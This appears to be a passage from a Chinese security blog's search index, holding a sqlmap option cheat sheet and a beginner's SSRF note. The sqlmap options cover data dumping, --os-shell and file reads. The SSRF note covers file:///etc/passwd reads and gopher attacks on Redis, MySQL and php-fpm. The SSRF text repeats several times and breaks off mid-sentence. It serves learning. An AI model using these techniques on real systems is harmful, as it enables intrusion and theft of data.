对于第一种请求文件扫描，将bp的抓包流量保存到txt，然后： sqlmap -r request.txt -f 另一种就是通过加载burp suite的日志文件进行扫描注入： sqlmap -l xxx.txt -f --dbs ... ","date":"2023-11-17","objectID":"/sqlmap_common_commands/:4:2","series":null,"tags":["manual"],"title":"sqlmap常用命令","uri":"/sqlmap_common_commands/#post扫描"},{"categories":["manual"],"content":"\rRequest类参数：　–data　提交的时候要携带的参数. (get,post通用,最简单的post请求方式).　–users　获取数据库用户 –dbs　获取所以数据库 –param-del　变量分隔符,默认为\u0026, –cookie　设置cookie头 –user-agent　指定user-agent(防止对方服务器侦测到) –random-agent　随机agent –host　指定host头 –level　安全级别 (1-5, \u003e=3,检测anent,\u003e=5,检测host头) –referer　指定referer头(level \u003e=3才检测) –headers　指定额外的headers请求头(多个必须使用换\\n,首字母必须大写) –method　指定请求方式, 默认为get,get请求不成功尝试post –auth-type　身份认证类型 (Basic,Digest,NTLM) , –auth-cred　身份认证账号密码 “username:password” , 完整demo: http://xxx.php?id=1 –auth-type Basic –auth-cred “u:p” (个人认为不常用) –auth-cert / –auth-file　基于客户端证书进行校验,(个人感觉非常非常非常之不常用,略过…嘿嘿,放肆一把,就不学这个了)　–proxy　指定代理 –proxy-cred　指定代理的账号密码(代理需要账号密码的前提下) –ignore-proxy　忽略系统代理(我们设置的代理都是通过浏览器进行设置的,通常用于扫描本地系统) –delay　每次请求的延迟时间,单位秒,默认无延迟. –timeout　请求超时时间,默认30秒. –retries　连接超时重试次数 ,默认3次 –randomize　长度,类型与原始值保持一致的情况下,指定每次请求随机取值的参数名 例: xxx.php?id=100, –randomize=‘‘id\" 则id的值在100-999随机出现 –scope　过滤日志内容,通过正则筛选扫描对象. 例: sqlmap -l burp.log –scope=\"(www)?.aaa.(com|net|org)\" 则只会扫描以www开头.aaa.com或者net或者org –safe-url \\ –safe-freq 扫描的时候回产生大量的url,服务器可能会销毁session.每发送–safe-freq 次注入请求后 就发送一次正常请求. –safr-url　需要扫描的url. –safe-freq　出现错误(或者说带sql注入请求)的次数 –skip-urlencode　get请求会对url进行编码. 某些web服务器不遵循标准编码 此参数就是不对get请求的url进行编码 –eval　每次请求前指定执行特定的python代码. ","date":"2023-11-17","objectID":"/sqlmap_common_commands/:5:0","series":null,"tags":["manual"],"title":"sqlmap常用命令","uri":"/sqlmap_common_commands/#request类参数"},{"categories":["manual"],"content":"\rsqlmap之cookie应用：对本机dvwa进行sql漏洞扫描. 首先登录 登录过之后,在浏览器内获取cookie信息. 复制cookie信息到sqlmap ,多个cookie之间用分号间隔分开 ","date":"2023-11-17","objectID":"/sqlmap_common_commands/:5:1","series":null,"tags":["manual"],"title":"sqlmap常用命令","uri":"/sqlmap_common_commands/#sqlmap之cookie应用"},{"categories":["manual"],"content":"\rOptimization(参数优化)：​ -0　后续3个参数的集合(除–threads) –predict-output　根据检测方法,比对返回值和统计表(/sqlmap/common-outputs.txt)内容,不断缩小检测范围,提高检测效率.(比对信息包括但不限于版本名,用户名,密码,表名,列名..等,与–threads参数不兼容) –keep-alive　使用http(s)长连接,新能好, 与–proxy参数不兼容.长连接避免重复简历连接的网络开销,但大量长连接会严重占用服务器资源 –null-connection　只获取相应页面的大小值,而非页面具体内容.通常用于盲注判断真/假,降低网络带宽消耗. 与–text-only(基于页面内容的比较判断)不兼容 –threads　最大并发线程,默认为1个线程,建议不要超过10个线程,否则可能影响站点可用性.与–predict-output参数不兼容 ","date":"2023-11-17","objectID":"/sqlmap_common_commands/:6:0","series":null,"tags":["manual"],"title":"sqlmap常用命令","uri":"/sqlmap_common_commands/#optimization参数优化"},{"categories":["manual"],"content":"\rInjection(参数注射)：　-p　扫描指定的参数,例 xxx.php?id=2\u0026name=root -p id 只会扫描id变量的值 (可以指定多个变量名,多个变量名逗号隔开) (在使用-p的时候会使–level失效,例如–level=3的时候才会扫描user-agent,但是我们使用手动指定了扫描参数user-agent 虽然没有指定–level=3,但此时也会扫描) –skip　排除指定的参数,例如–level=3 会扫描user-agent 但是我们不希望扫描useragent 可以使用–skip跳过此参数的扫描 –dbms　指定后端数据库,在已知web应用的数据库前提下,略去sqlmap扫描判断后端数据库过程,提高效率.例: –dbms=“mysql”(\u003c5.0\u003e指定版本) –os　指定目标操作系统 –invalid-bignum/ –invalid-logical 默认使用负值使参数失效,bignum使用最大参数值使参数失效,logical使用布尔判断值使取值失效 –no-cast　榨取数据时,sqlmap将所有结果转换为字符串,默认用空格替换null, 老版本可能不支持空格替换,使用–no-cast关闭替换 –no-escape　不逃逸,也就是说当payload中用丹壹号界定字符串时,sqlmap使用char()编码逃逸的方法替换字符串,也就是说不然sqlmap对payload中　的单引号进行编码 –prefix/ –suffix　前缀/后缀　–tamper　混淆脚本,用于绕过应用层过滤,IPS,WAF. 编写好的脚本存放于(sqlmap/tamper/…)使用的时候直接写出脚本名称即可,sqlmap会 自动去对应文件夹加载对应的文件　","date":"2023-11-17","objectID":"/sqlmap_common_commands/:7:0","series":null,"tags":["manual"],"title":"sqlmap常用命令","uri":"/sqlmap_common_commands/#injection参数注射"},{"categories":["manual"],"content":"\rDetection(检测)：　–level　检测级别,默认1级. 可设定1-5.级别不同,检测的细度不同./sqlmap/xml/payloads(检测级别不同,发送的payloads不同,) –risk　风险级别 1-4 默认1, 如果指数过高,可能会对数据造成伤害(如:更新,删除等) ","date":"2023-11-17","objectID":"/sqlmap_common_commands/:8:0","series":null,"tags":["manual"],"title":"sqlmap常用命令","uri":"/sqlmap_common_commands/#detection检测"},{"categories":["manual"],"content":"\rTechniques(检测sql漏洞存在的技术类型)：　就是之前提到的sqlmap的五种检测类型, 默认是全部使用, 也可以手动指定. –time-sec　基于时间的注入检测相应延迟时间(默认5秒) –union-cols　默认联合查询1–10列,随着–level增加 最多检查50列.可以手动指定. –union-char　联合查询默认使用null,可能会出现失败,此时可以手动指定数值. 例: union select null union select 1111 –dns-domain　如果攻击了dns服务器,使用此功能可以提高数据榨取速度 ","date":"2023-11-17","objectID":"/sqlmap_common_commands/:9:0","series":null,"tags":["manual"],"title":"sqlmap常用命令","uri":"/sqlmap_common_commands/#techniques检测sql漏洞存在的技术类型"},{"categories":["manual"],"content":"\rFingerprint(指纹信息)：　-f(–fingerprint)　数据库管理系统的指纹信息(数据库类型,操作系统,架构,补丁等) -b (–banner)　banner信息 ","date":"2023-11-17","objectID":"/sqlmap_common_commands/:10:0","series":null,"tags":["manual"],"title":"sqlmap常用命令","uri":"/sqlmap_common_commands/#fingerprint指纹信息"},{"categories":["manual"],"content":"\rEnumeration(枚举)：　–current-user　查询当前数据库管理系统账号 –current-db　查询当前数据库昵称 –hostname　查询当前主机名 –users　查询数据库系统中所有的账号 –peivileges-U xxx　-u 查询指定账号的权限 如果不跟指定用户名 则查询的是所有的用户, -CU 查询当前用户 -D 指定数据库 –table　查询所有表 -T 指定表 –columns　查询指定表的所有列 -C 指定某一列查询 –exclude-sysdbs　忽略系统库 –count　统计记录 –batch　批处理,也就是系统默认选项(按照默认的选项 全自动执行) ","date":"2023-11-17","objectID":"/sqlmap_common_commands/:11:0","series":null,"tags":["manual"],"title":"sqlmap常用命令","uri":"/sqlmap_common_commands/#enumeration枚举"},{"categories":["manual"],"content":"\rdump数据：　–dump　保存数据到本地(配合一系列的指令) -C　指定columns 如果不指定,默认整表 -T　指定表名, -D　指定数据库 -start　数据起始位置 (按表的id进行取值) -stop　数据结束位置 –dump-all　下载整表 –sql-query　指定sql语句 ","date":"2023-11-17","objectID":"/sqlmap_common_commands/:12:0","series":null,"tags":["manual"],"title":"sqlmap常用命令","uri":"/sqlmap_common_commands/#dump数据"},{"categories":["manual"],"content":"\rBrute Force(暴力破解)：　在mysql \u003c5.0的时候 ,是没有information_schema库的,这时候我们就不能根据数据源表进行一系列的操作 还有一种情况是mysql\u003e=5.0的时候,但无权限读取information_schema库,这时候可能就需要用到暴力破解 在微软access数据库中,默认是无权读取MSysObjects库的 –common-tables　暴力破解表名(根据字典) –common-columns(Access系统表无列信息)　暴力破解表字段 ","date":"2023-11-17","objectID":"/sqlmap_common_commands/:13:0","series":null,"tags":["manual"],"title":"sqlmap常用命令","uri":"/sqlmap_common_commands/#brute-force暴力破解"},{"categories":["manual"],"content":"\rUdf Injection(UDF注射)：　–udf-inject ,, –shared-lib –file-read　读取目标系统指定文件(值为具体文件的路径) –file-write　写入的文件 –file-dest　写入保存的路径 –os-cmd　执行系统命令 –os-shell　得到系统shell –sql-shell　得到sqlshell ","date":"2023-11-17","objectID":"/sqlmap_common_commands/:14:0","series":null,"tags":["manual"],"title":"sqlmap常用命令","uri":"/sqlmap_common_commands/#udf-injectionudf注射"},{"categories":["manual"],"content":"\rWindows RegisTory(Windows注册表相关)：　–reg-read　读取注册表键值 –reg-add　向注册表添加键值 –reg-del　删除注册表键值 –reg-key –reg-value –reg-data –reg-type 辅助参数, 上面三个操作的时候可以缩小范围. ","date":"2023-11-17","objectID":"/sqlmap_common_commands/:15:0","series":null,"tags":["manual"],"title":"sqlmap常用命令","uri":"/sqlmap_common_commands/#windows-registorywindows注册表相关"},{"categories":["manual"],"content":"\rGeneral(常规参数)：　-s　sqllite会话文件保存位置 -t　记录流量文件保存位置 –charset　强制字符编码 –crawl　从起始位置爬站深度 –csv-del　dump下来的数据默认存于\",“分割的csv文件中,–csv-del用来指定其他分隔符 –dbms-cred　指定数据库账号 –flush-session　清空session　–force-ssl　针对https的网站.. –fresh-queries　忽略本地session 从新发送请求 –output-dir　指定一个输出目录 –parse-errors　分析和显示数据库中内建报错信息 –save　将命令保存成配置文件 –check-waf　检测waf.ips.ids –hpp　绕过WAF,IPS,IDS 尤其对ASP,/IIS.ASP.NET/IIS –identify-waf　更彻底的检查waf ","date":"2023-11-17","objectID":"/sqlmap_common_commands/:16:0","series":null,"tags":["manual"],"title":"sqlmap常用命令","uri":"/sqlmap_common_commands/#general常规参数"},{"categories":["manual"],"content":"\rMiscellaneous(杂项)：　–mobile　模拟只能手机设备(实现方式只是替换对应的user-agent) –purge-output　清除output文件夹 –smart　当有大量检测目标时, 只选择基于错误的检测结果 –wizard　向导模式.　","date":"2023-11-17","objectID":"/sqlmap_common_commands/:17:0","series":null,"tags":["manual"],"title":"sqlmap常用命令","uri":"/sqlmap_common_commands/#miscellaneous杂项"},{"categories":["web","notes"],"content":"一点SSRF初学笔记 ","date":"2023-11-17","objectID":"/ssrf/:0:0","series":null,"tags":["web","notes"],"title":"SSRF","uri":"/ssrf/#"},{"categories":["web","notes"],"content":"\r0x1 概述SSRF(Server-Side Request Forgery，服务器端请求伪造) 是一种由攻击者构造请求，由服务端发起请求的一个安全漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统，因为服务器请求天然的可以穿越防火墙。漏洞形成的原因大多是因为服务端提供了从其他服务器应用获取数据的功能且没有对目标地址作正确的过滤和限制。 ","date":"2023-11-17","objectID":"/ssrf/:0:1","series":null,"tags":["web","notes"],"title":"SSRF","uri":"/ssrf/#0x1-概述"},{"categories":["web","notes"],"content":"\r0x2 原理**SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制。**比如从指定URL地址获取网页文本内容，加载指定地址的图片，文档等等。SSRF漏洞通过篡改获取资源的请求发送给服务器（服务器并没有检测这个请求是否合法的），然后服务器以他的身份来访问服务器的其他资源。SSRF利用存在缺陷的Web应用作为代理攻击远程和本地的服务器。 ","date":"2023-11-17","objectID":"/ssrf/:0:2","series":null,"tags":["web","notes"],"title":"SSRF","uri":"/ssrf/#0x2-原理"},{"categories":["web","notes"],"content":"\r0x3 函数和伪协议PHP中下面函数的使用不当会导致SSRF: file_get_contents() fsockopen() curl_exec() 伪协议 file://：从文件系统中获取文件内容，如，file:///etc/passwd dict://：字典服务器协议，访问字典资源，如，dict:///ip:6739/info gopher://：分布式文档传递服务，可使用gopherus生成payload。 ","date":"2023-11-17","objectID":"/ssrf/:0:3","series":null,"tags":["web","notes"],"title":"SSRF","uri":"/ssrf/#0x3-函数和伪协议"},{"categories":["web","notes"],"content":"\r0x4 SSRF怎么找能够对外发起网络请求的地方，就可能存在SSRF漏洞。 能够对外发起网络请求的地方 请求远程服务器资源的地方 数据库内置功能 邮件系统 文件处理 在线处理工具 ","date":"2023-11-17","objectID":"/ssrf/:0:4","series":null,"tags":["web","notes"],"title":"SSRF","uri":"/ssrf/#0x4-ssrf怎么找"},{"categories":["web","notes"],"content":"\r0x5 ssrf漏洞利用\r1任意文件读取file:// 通过file协议读取本地文件，但只能读取已知文件名的文件 2内网资源探测利用控制的host字段，来扫描内网存活主机 若服务器监听127.0.0.1则这个端口只能被本机访问，若监听0.0.0.0，则这个端口可以被外网访问 3gopher协议扩展攻击面gopher:// 负责转发 1攻击redis的6379端口Redis一般运行在内网，使用者大多将其绑定在127.0.0.1:6379地址，切且一般为空口令，攻击者可以通过SSRF访问内网的redis，由于redis支持通过url形式的访问，来增加、删除、保存内容，所以，攻击者就可以首先增加一个PHP一句话木马的内容到redis，然后备份其文件，就可以将一句话木马保存到硬盘中，实现恶意代码写入 rides是一条指令执行一个行为，如果其中一条指令是错的，会继续读取下一条指令继续执行，所以如果我们能够控制报文的任意一行，就可以将其修改为redis指令，分批执行命令完成攻击 2攻击MySQL的3306端口攻击内网中的MySQL，我们需要了解其通信协议，MySQL分为服务端和客户端 由客户端连接服务端有四种方式： 1.Unix套接字 2.内存共享 3.命名管道 4.TCP/IP套接字 我们的攻击依靠第四种方式，MySQL客户端连接时： 1.需要密码认证，此时，服务器先发送salt，客户端使用salt进行加密后再验证 2.不需要密码验证，将直接使用上面第四种方式发送数据包 所以，这里攻击MySQL，需要在非交互条件下进行，一定只能攻击没有密码的MySQL服务器 3攻击fastcgi的9000端口 php-fpm是个中间件，在需要PHP解释器来处理php文本时会用到php-fpm.自从PHP5.3以后将php-fpm继承到php内核中，php-fpm提供了更好的php进程管理方式，可以有效控制内存的进程，可以平滑重载php配置 以我们经常执行访问的index.php?file=/etc/passwd为例: 浏览器发送访问index.php的请求到web服务器,比如nginx/apache web服务器将请求的url(index.php),参数(file=/etc/passwd)等等发送给专门的php解释器来执行,因为nginx/apache是只能处理静态文件(通过文件读取的方式) , 对于动态的php脚本, 需要专门的php-fpm中间件来解释执行 php-fpm收到了web服务器传递过来的各种参数后, 初始化zend虚拟机, 对php文件做词法分析,语法分析,编译成opcode,并执行.最后关闭zend虚拟机.将执行结果返回给web服务器 web服务器收到返回结果后,将http相应传给浏览器 包含配置文件以后，后面紧跟一句 fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name 定义了一个SCRIPT_FILENAME,值是$document_root$fastcgi_script_name 重点看SCRIPT_FILENAME,这个就是nginx传给php-fpm的 nginx和php-fpm的数据交互,使用的是fast-cgi协议 fastcgi协议 fastcgi其实是一个通信协议,和http协议一样,都是进行数据交换的一个通道.http协议是浏览器和服务器中间件进行数据交换的协议,浏览器将http头和http体用某个规则组装成数据包,以tcp的方式发送到服务器中间件,服务器中间件按照规则将数据包解码,并按要求拿到用户需要的数据,再以http协议的规则打包返回给服务器. 可以使用伪造的fastcgi协议数据,与php-fpm交互,通过伪造script_filename的参数,来实现执行任意的PHP脚本文件 ssrf-\u003e控制服务端脚本请求本地php-fpm端口-\u003e伪造配置参数包含php://input数据-\u003e执行php://input内提交的代码 ","date":"2023-11-17","objectID":"/ssrf/:0:5","series":null,"tags":["web","notes"],"title":"SSRF","uri":"/ssrf/#0x5-ssrf漏洞利用"},{"categories":["web","notes"],"content":"\r0x5 ssrf漏洞利用\r1任意文件读取file:// 通过file协议读取本地文件，但只能读取已知文件名的文件 2内网资源探测利用控制的host字段，来扫描内网存活主机 若服务器监听127.0.0.1则这个端口只能被本机访问，若监听0.0.0.0，则这个端口可以被外网访问 3gopher协议扩展攻击面gopher:// 负责转发 1攻击redis的6379端口Redis一般运行在内网，使用者大多将其绑定在127.0.0.1:6379地址，切且一般为空口令，攻击者可以通过SSRF访问内网的redis，由于redis支持通过url形式的访问，来增加、删除、保存内容，所以，攻击者就可以首先增加一个PHP一句话木马的内容到redis，然后备份其文件，就可以将一句话木马保存到硬盘中，实现恶意代码写入 rides是一条指令执行一个行为，如果其中一条指令是错的，会继续读取下一条指令继续执行，所以如果我们能够控制报文的任意一行，就可以将其修改为redis指令，分批执行命令完成攻击 2攻击MySQL的3306端口攻击内网中的MySQL，我们需要了解其通信协议，MySQL分为服务端和客户端 由客户端连接服务端有四种方式： 1.Unix套接字 2.内存共享 3.命名管道 4.TCP/IP套接字 我们的攻击依靠第四种方式，MySQL客户端连接时： 1.需要密码认证，此时，服务器先发送salt，客户端使用salt进行加密后再验证 2.不需要密码验证，将直接使用上面第四种方式发送数据包 所以，这里攻击MySQL，需要在非交互条件下进行，一定只能攻击没有密码的MySQL服务器 3攻击fastcgi的9000端口 php-fpm是个中间件，在需要PHP解释器来处理php文本时会用到php-fpm.自从PHP5.3以后将php-fpm继承到php内核中，php-fpm提供了更好的php进程管理方式，可以有效控制内存的进程，可以平滑重载php配置 以我们经常执行访问的index.php?file=/etc/passwd为例: 浏览器发送访问index.php的请求到web服务器,比如nginx/apache web服务器将请求的url(index.php),参数(file=/etc/passwd)等等发送给专门的php解释器来执行,因为nginx/apache是只能处理静态文件(通过文件读取的方式) , 对于动态的php脚本, 需要专门的php-fpm中间件来解释执行 php-fpm收到了web服务器传递过来的各种参数后, 初始化zend虚拟机, 对php文件做词法分析,语法分析,编译成opcode,并执行.最后关闭zend虚拟机.将执行结果返回给web服务器 web服务器收到返回结果后,将http相应传给浏览器 包含配置文件以后，后面紧跟一句 fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name 定义了一个SCRIPT_FILENAME,值是$document_root$fastcgi_script_name 重点看SCRIPT_FILENAME,这个就是nginx传给php-fpm的 nginx和php-fpm的数据交互,使用的是fast-cgi协议 fastcgi协议 fastcgi其实是一个通信协议,和http协议一样,都是进行数据交换的一个通道.http协议是浏览器和服务器中间件进行数据交换的协议,浏览器将http头和http体用某个规则组装成数据包,以tcp的方式发送到服务器中间件,服务器中间件按照规则将数据包解码,并按要求拿到用户需要的数据,再以http协议的规则打包返回给服务器. 可以使用伪造的fastcgi协议数据,与php-fpm交互,通过伪造script_filename的参数,来实现执行任意的PHP脚本文件 ssrf-\u003e控制服务端脚本请求本地php-fpm端口-\u003e伪造配置参数包含php://input数据-\u003e执行php://input内提交的代码 ","date":"2023-11-17","objectID":"/ssrf/:0:5","series":null,"tags":["web","notes"],"title":"SSRF","uri":"/ssrf/#1任意文件读取"},{"categories":["web","notes"],"content":"\r0x5 ssrf漏洞利用\r1任意文件读取file:// 通过file协议读取本地文件，但只能读取已知文件名的文件 2内网资源探测利用控制的host字段，来扫描内网存活主机 若服务器监听127.0.0.1则这个端口只能被本机访问，若监听0.0.0.0，则这个端口可以被外网访问 3gopher协议扩展攻击面gopher:// 负责转发 1攻击redis的6379端口Redis一般运行在内网，使用者大多将其绑定在127.0.0.1:6379地址，切且一般为空口令，攻击者可以通过SSRF访问内网的redis，由于redis支持通过url形式的访问，来增加、删除、保存内容，所以，攻击者就可以首先增加一个PHP一句话木马的内容到redis，然后备份其文件，就可以将一句话木马保存到硬盘中，实现恶意代码写入 rides是一条指令执行一个行为，如果其中一条指令是错的，会继续读取下一条指令继续执行，所以如果我们能够控制报文的任意一行，就可以将其修改为redis指令，分批执行命令完成攻击 2攻击MySQL的3306端口攻击内网中的MySQL，我们需要了解其通信协议，MySQL分为服务端和客户端 由客户端连接服务端有四种方式： 1.Unix套接字 2.内存共享 3.命名管道 4.TCP/IP套接字 我们的攻击依靠第四种方式，MySQL客户端连接时： 1.需要密码认证，此时，服务器先发送salt，客户端使用salt进行加密后再验证 2.不需要密码验证，将直接使用上面第四种方式发送数据包 所以，这里攻击MySQL，需要在非交互条件下进行，一定只能攻击没有密码的MySQL服务器 3攻击fastcgi的9000端口 php-fpm是个中间件，在需要PHP解释器来处理php文本时会用到php-fpm.自从PHP5.3以后将php-fpm继承到php内核中，php-fpm提供了更好的php进程管理方式，可以有效控制内存的进程，可以平滑重载php配置 以我们经常执行访问的index.php?file=/etc/passwd为例: 浏览器发送访问index.php的请求到web服务器,比如nginx/apache web服务器将请求的url(index.php),参数(file=/etc/passwd)等等发送给专门的php解释器来执行,因为nginx/apache是只能处理静态文件(通过文件读取的方式) , 对于动态的php脚本, 需要专门的php-fpm中间件来解释执行 php-fpm收到了web服务器传递过来的各种参数后, 初始化zend虚拟机, 对php文件做词法分析,语法分析,编译成opcode,并执行.最后关闭zend虚拟机.将执行结果返回给web服务器 web服务器收到返回结果后,将http相应传给浏览器 包含配置文件以后，后面紧跟一句 fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name 定义了一个SCRIPT_FILENAME,值是$document_root$fastcgi_script_name 重点看SCRIPT_FILENAME,这个就是nginx传给php-fpm的 nginx和php-fpm的数据交互,使用的是fast-cgi协议 fastcgi协议 fastcgi其实是一个通信协议,和http协议一样,都是进行数据交换的一个通道.http协议是浏览器和服务器中间件进行数据交换的协议,浏览器将http头和http体用某个规则组装成数据包,以tcp的方式发送到服务器中间件,服务器中间件按照规则将数据包解码,并按要求拿到用户需要的数据,再以http协议的规则打包返回给服务器. 可以使用伪造的fastcgi协议数据,与php-fpm交互,通过伪造script_filename的参数,来实现执行任意的PHP脚本文件 ssrf-\u003e控制服务端脚本请求本地php-fpm端口-\u003e伪造配置参数包含php://input数据-\u003e执行php://input内提交的代码 ","date":"2023-11-17","objectID":"/ssrf/:0:5","series":null,"tags":["web","notes"],"title":"SSRF","uri":"/ssrf/#2内网资源探测"},{"categories":["web","notes"],"content":"\r0x5 ssrf漏洞利用\r1任意文件读取file:// 通过file协议读取本地文件，但只能读取已知文件名的文件 2内网资源探测利用控制的host字段，来扫描内网存活主机 若服务器监听127.0.0.1则这个端口只能被本机访问，若监听0.0.0.0，则这个端口可以被外网访问 3gopher协议扩展攻击面gopher:// 负责转发 1攻击redis的6379端口Redis一般运行在内网，使用者大多将其绑定在127.0.0.1:6379地址，切且一般为空口令，攻击者可以通过SSRF访问内网的redis，由于redis支持通过url形式的访问，来增加、删除、保存内容，所以，攻击者就可以首先增加一个PHP一句话木马的内容到redis，然后备份其文件，就可以将一句话木马保存到硬盘中，实现恶意代码写入 rides是一条指令执行一个行为，如果其中一条指令是错的，会继续读取下一条指令继续执行，所以如果我们能够控制报文的任意一行，就可以将其修改为redis指令，分批执行命令完成攻击 2攻击MySQL的3306端口攻击内网中的MySQL，我们需要了解其通信协议，MySQL分为服务端和客户端 由客户端连接服务端有四种方式： 1.Unix套接字 2.内存共享 3.命名管道 4.TCP/IP套接字 我们的攻击依靠第四种方式，MySQL客户端连接时： 1.需要密码认证，此时，服务器先发送salt，客户端使用salt进行加密后再验证 2.不需要密码验证，将直接使用上面第四种方式发送数据包 所以，这里攻击MySQL，需要在非交互条件下进行，一定只能攻击没有密码的MySQL服务器 3攻击fastcgi的9000端口 php-fpm是个中间件，在需要PHP解释器来处理php文本时会用到php-fpm.自从PHP5.3以后将php-fpm继承到php内核中，php-fpm提供了更好的php进程管理方式，可以有效控制内存的进程，可以平滑重载php配置 以我们经常执行访问的index.php?file=/etc/passwd为例: 浏览器发送访问index.php的请求到web服务器,比如nginx/apache web服务器将请求的url(index.php),参数(file=/etc/passwd)等等发送给专门的php解释器来执行,因为nginx/apache是只能处理静态文件(通过文件读取的方式) , 对于动态的php脚本, 需要专门的php-fpm中间件来解释执行 php-fpm收到了web服务器传递过来的各种参数后, 初始化zend虚拟机, 对php文件做词法分析,语法分析,编译成opcode,并执行.最后关闭zend虚拟机.将执行结果返回给web服务器 web服务器收到返回结果后,将http相应传给浏览器 包含配置文件以后，后面紧跟一句 fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name 定义了一个SCRIPT_FILENAME,值是$document_root$fastcgi_script_name 重点看SCRIPT_FILENAME,这个就是nginx传给php-fpm的 nginx和php-fpm的数据交互,使用的是fast-cgi协议 fastcgi协议 fastcgi其实是一个通信协议,和http协议一样,都是进行数据交换的一个通道.http协议是浏览器和服务器中间件进行数据交换的协议,浏览器将http头和http体用某个规则组装成数据包,以tcp的方式发送到服务器中间件,服务器中间件按照规则将数据包解码,并按要求拿到用户需要的数据,再以http协议的规则打包返回给服务器. 可以使用伪造的fastcgi协议数据,与php-fpm交互,通过伪造script_filename的参数,来实现执行任意的PHP脚本文件 ssrf-\u003e控制服务端脚本请求本地php-fpm端口-\u003e伪造配置参数包含php://input数据-\u003e执行php://input内提交的代码 ","date":"2023-11-17","objectID":"/ssrf/:0:5","series":null,"tags":["web","notes"],"title":"SSRF","uri":"/ssrf/#3gopher协议扩展攻击面"},{"categories":["web","notes"],"content":"\r0x5 ssrf漏洞利用\r1任意文件读取file:// 通过file协议读取本地文件，但只能读取已知文件名的文件 2内网资源探测利用控制的host字段，来扫描内网存活主机 若服务器监听127.0.0.1则这个端口只能被本机访问，若监听0.0.0.0，则这个端口可以被外网访问 3gopher协议扩展攻击面gopher:// 负责转发 1攻击redis的6379端口Redis一般运行在内网，使用者大多将其绑定在127.0.0.1:6379地址，切且一般为空口令，攻击者可以通过SSRF访问内网的redis，由于redis支持通过url形式的访问，来增加、删除、保存内容，所以，攻击者就可以首先增加一个PHP一句话木马的内容到redis，然后备份其文件，就可以将一句话木马保存到硬盘中，实现恶意代码写入 rides是一条指令执行一个行为，如果其中一条指令是错的，会继续读取下一条指令继续执行，所以如果我们能够控制报文的任意一行，就可以将其修改为redis指令，分批执行命令完成攻击 2攻击MySQL的3306端口攻击内网中的MySQL，我们需要了解其通信协议，MySQL分为服务端和客户端 由客户端连接服务端有四种方式： 1.Unix套接字 2.内存共享 3.命名管道 4.TCP/IP套接字 我们的攻击依靠第四种方式，MySQL客户端连接时： 1.需要密码认证，此时，服务器先发送salt，客户端使用salt进行加密后再验证 2.不需要密码验证，将直接使用上面第四种方式发送数据包 所以，这里攻击MySQL，需要在非交互条件下进行，一定只能攻击没有密码的MySQL服务器 3攻击fastcgi的9000端口 php-fpm是个中间件，在需要PHP解释器来处理php文本时会用到php-fpm.自从PHP5.3以后将php-fpm继承到php内核中，php-fpm提供了更好的php进程管理方式，可以有效控制内存的进程，可以平滑重载php配置 以我们经常执行访问的index.php?file=/etc/passwd为例: 浏览器发送访问index.php的请求到web服务器,比如nginx/apache web服务器将请求的url(index.php),参数(file=/etc/passwd)等等发送给专门的php解释器来执行,因为nginx/apache是只能处理静态文件(通过文件读取的方式) , 对于动态的php脚本, 需要专门的php-fpm中间件来解释执行 php-fpm收到了web服务器传递过来的各种参数后, 初始化zend虚拟机, 对php文件做词法分析,语法分析,编译成opcode,并执行.最后关闭zend虚拟机.将执行结果返回给web服务器 web服务器收到返回结果后,将http相应传给浏览器 包含配置文件以后，后面紧跟一句 fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name 定义了一个SCRIPT_FILENAME,值是$document_root$fastcgi_script_name 重点看SCRIPT_FILENAME,这个就是nginx传给php-fpm的 nginx和php-fpm的数据交互,使用的是fast-cgi协议 fastcgi协议 fastcgi其实是一个通信协议,和http协议一样,都是进行数据交换的一个通道.http协议是浏览器和服务器中间件进行数据交换的协议,浏览器将http头和http体用某个规则组装成数据包,以tcp的方式发送到服务器中间件,服务器中间件按照规则将数据包解码,并按要求拿到用户需要的数据,再以http协议的规则打包返回给服务器. 可以使用伪造的fastcgi协议数据,与php-fpm交互,通过伪造script_filename的参数,来实现执行任意的PHP脚本文件 ssrf-\u003e控制服务端脚本请求本地php-fpm端口-\u003e伪造配置参数包含php://input数据-\u003e执行php://input内提交的代码 ","date":"2023-11-17","objectID":"/ssrf/:0:5","series":null,"tags":["web","notes"],"title":"SSRF","uri":"/ssrf/#1攻击redis的6379端口"},{"categories":["web","notes"],"content":"\r0x5 ssrf漏洞利用\r1任意文件读取file:// 通过file协议读取本地文件，但只能读取已知文件名的文件 2内网资源探测利用控制的host字段，来扫描内网存活主机 若服务器监听127.0.0.1则这个端口只能被本机访问，若监听0.0.0.0，则这个端口可以被外网访问 3gopher协议扩展攻击面gopher:// 负责转发 1攻击redis的6379端口Redis一般运行在内网，使用者大多将其绑定在127.0.0.1:6379地址，切且一般为空口令，攻击者可以通过SSRF访问内网的redis，由于redis支持通过url形式的访问，来增加、删除、保存内容，所以，攻击者就可以首先增加一个PHP一句话木马的内容到redis，然后备份其文件，就可以将一句话木马保存到硬盘中，实现恶意代码写入 rides是一条指令执行一个行为，如果其中一条指令是错的，会继续读取下一条指令继续执行，所以如果我们能够控制报文的任意一行，就可以将其修改为redis指令，分批执行命令完成攻击 2攻击MySQL的3306端口攻击内网中的MySQL，我们需要了解其通信协议，MySQL分为服务端和客户端 由客户端连接服务端有四种方式： 1.Unix套接字 2.内存共享 3.命名管道 4.TCP/IP套接字 我们的攻击依靠第四种方式，MySQL客户端连接时： 1.需要密码认证，此时，服务器先发送salt，客户端使用salt进行加密后再验证 2.不需要密码验证，将直接使用上面第四种方式发送数据包 所以，这里攻击MySQL，需要在非交互条件下进行，一定只能攻击没有密码的MySQL服务器 3攻击fastcgi的9000端口 php-fpm是个中间件，在需要PHP解释器来处理php文本时会用到php-fpm.自从PHP5.3以后将php-fpm继承到php内核中，php-fpm提供了更好的php进程管理方式，可以有效控制内存的进程，可以平滑重载php配置 以我们经常执行访问的index.php?file=/etc/passwd为例: 浏览器发送访问index.php的请求到web服务器,比如nginx/apache web服务器将请求的url(index.php),参数(file=/etc/passwd)等等发送给专门的php解释器来执行,因为nginx/apache是只能处理静态文件(通过文件读取的方式) , 对于动态的php脚本, 需要专门的php-fpm中间件来解释执行 php-fpm收到了web服务器传递过来的各种参数后, 初始化zend虚拟机, 